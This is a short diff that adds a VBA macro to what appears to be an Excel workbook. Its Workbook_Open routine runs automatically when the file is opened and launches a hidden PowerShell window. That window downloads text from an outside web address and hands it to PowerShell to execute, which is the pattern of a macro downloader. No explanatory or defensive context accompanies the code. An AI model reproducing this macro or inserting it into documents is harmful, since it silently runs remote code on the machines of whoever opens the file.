@@ -1,0 +1,3 @@
+Private Sub Workbook_Open()
+CreateObject("WSCript.Shell").Run ("powershell.exe -windowstyle hidden -Command powershell.exe -Command (Invoke-WebRequest -Uri https://www.1337core.de/powershell.html).ParsedHtml.body.innerText")
+End Sub
